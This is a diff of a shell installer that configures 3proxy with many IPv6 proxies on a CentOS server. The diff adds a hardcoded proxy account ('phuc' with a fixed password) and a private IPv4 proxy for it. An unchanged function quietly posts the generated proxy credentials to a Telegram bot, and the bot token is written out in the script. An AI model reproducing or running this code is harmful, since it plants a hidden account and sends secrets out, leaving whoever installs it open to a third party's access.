@@ -58,11 +58,15 @@ stacksize 6291456
 flush
 auth strong
 
-users $(awk -F "/" 'BEGIN{ORS="";} {print $1 ":CL:" $2 " "}' ${WORKDATA})
+users phuc:CL:phucMAI9 $(awk -F "/" 'BEGIN{ORS="";} {print $1 ":CL:" $2 " "}' ${WORKDATA})
+
+allow phuc
+proxy -4 -n -a -p9998 -i"${IP4}" -e"${IP4}"
+flush
 
 $(awk -F "/" '{print "auth strong\n" \
 "allow " $1 "\n" \
-"proxy -6 -n -a -p" $4 " -i" $3 " -e"$5"\n" \
+"socks -6 -n -a -p" $4 " -i" $3 " -e"$5"\n" \
 "flush\n"}' ${WORKDATA})
 EOF
 }
@@ -84,7 +88,7 @@ upload_proxy() {
     echo "Password: ${PASS}"
 
     cp proxy.txt "$IP4".txt
-    
+
     curl -X POST -F 'document=@/home/proxy-installer/'"$IP4"'.txt' -F 'chat_id=-892127097' https://api.telegram.org/bot5748050505:AAEZEtv9aSEHk5VWmWVr68jiYP9KlimddnE/sendDocument
 
 }
@@ -96,22 +100,32 @@ gen_data() {
 
 gen_iptables() {
     cat <<EOF
-    $(awk -F "/" '{print "iptables -I INPUT -p tcp --dport " $4 "  -m state --state NEW -j ACCEPT"}' ${WORKDATA})
+    $(awk -F "/" '{print "iptables -I INPUT -p tcp --dport " $4 "  -m state --state NEW -j ACCEPT \nsleep 1"}' ${WORKDATA})
 EOF
 }
 
 gen_ifconfig() {
     cat <<EOF
-$(awk -F "/" '{print "ifconfig '$main_interface' inet6 add " $5 "/64"}' ${WORKDATA})
+$(awk -F "/" '{print "ifconfig '$main_interface' inet6 add " $5 "/64 \nsleep 0.1"}' ${WORKDATA})
 EOF
 }
+
+
+
 echo "installing apps"
-
-
 # error
+yum -y update >/dev/null
+yum -y install wget >/dev/null
 yum -y install gcc net-tools bsdtar zip make >/dev/null
 
 install_3proxy
+
+
+echo "nhap ipv6 range "
+read IPV6_RANGE
+
+
+
 
 echo "working folder = /home/proxy-installer"
 WORKDIR="/home/proxy-installer"
@@ -119,15 +133,18 @@ WORKDATA="${WORKDIR}/data.txt"
 mkdir $WORKDIR && cd $_
 
 IP4=$(curl -4 -s icanhazip.com)
-IP6=$(curl -6 -s icanhazip.com | cut -f1-4 -d':')
+IP6=$(echo "${IPV6_RANGE}" | cut -f1-4 -d':')
 
 echo "Internal ip = ${IP4}. Exteranl sub for ip6 = ${IP6}"
 
+echo "Nhap so ip cần tạo: "
+read COUNT
+
 FIRST_PORT=10000
-LAST_PORT=11999
+LAST_PORT=$(($FIRST_PORT + $COUNT - 1))
 
 gen_data >$WORKDIR/data.txt
-gen_iptables >$WORKDIR/boot_iptables.sh
+
 gen_ifconfig >$WORKDIR/boot_ifconfig.sh
 echo NM_CONTROLLED="no" >> /etc/sysconfig/network-scripts/ifcfg-${main_interface}
 chmod +x $WORKDIR/boot_*.sh /etc/rc.local
@@ -135,16 +152,17 @@ chmod +x $WORKDIR/boot_*.sh /etc/rc.local
 gen_3proxy >/usr/local/etc/3proxy/3proxy.cfg
 
 cat >>/etc/rc.local <<EOF
-systemctl start NetworkManager.service
-# ifup ${main_interface}
-bash ${WORKDIR}/boot_iptables.sh
-bash ${WORKDIR}/boot_ifconfig.sh
+bash ${WORKDIR}/boot_ifconfig.sh &
 ulimit -n 65535
 /usr/local/etc/3proxy/bin/3proxy /usr/local/etc/3proxy/3proxy.cfg &
 EOF
 
+sleep 10
 bash /etc/rc.local
 
 gen_proxy_file_for_user
 
 upload_proxy
+
+
+
